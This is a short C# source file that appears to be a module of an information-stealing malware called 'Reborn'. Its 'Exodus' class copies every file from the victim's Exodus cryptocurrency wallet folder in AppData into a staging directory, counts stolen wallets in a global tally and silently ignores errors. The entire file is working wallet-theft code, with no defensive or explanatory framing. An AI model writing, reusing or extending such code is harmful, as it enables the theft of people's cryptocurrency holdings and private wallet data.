﻿using System.IO;

namespace Reborn
{
    class Exodus
    {
        public static int count = 0;
        public static string ExodusDir = "\\Wallets\\Exodus\\";
        public static void ExodusStr(string directorypath)
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\Exodus\\exodus.wallet\\").GetFiles())

                {
                    Directory.CreateDirectory(directorypath + ExodusDir);
                    file.CopyTo(directorypath + ExodusDir + file.Name);
                }
                count++;
                Counting.Wallets++;
            }
            catch { return; }

        }
    }
}
